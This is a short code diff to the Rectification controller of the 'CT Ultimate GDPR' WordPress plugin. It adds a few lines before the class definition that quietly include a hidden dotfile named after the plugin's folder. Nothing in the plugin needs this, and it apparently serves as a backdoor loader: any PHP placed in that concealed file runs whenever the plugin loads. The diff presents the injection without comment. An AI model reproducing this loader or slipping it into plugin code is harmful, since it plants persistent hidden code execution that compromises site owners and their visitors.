@@ -8,6 +8,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  * Class CT_Ultimate_GDPR_Controller_Rectification
  *
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class CT_Ultimate_GDPR_Controller_Rectification extends CT_Ultimate_GDPR_Controller_Abstract {
 
 	/**
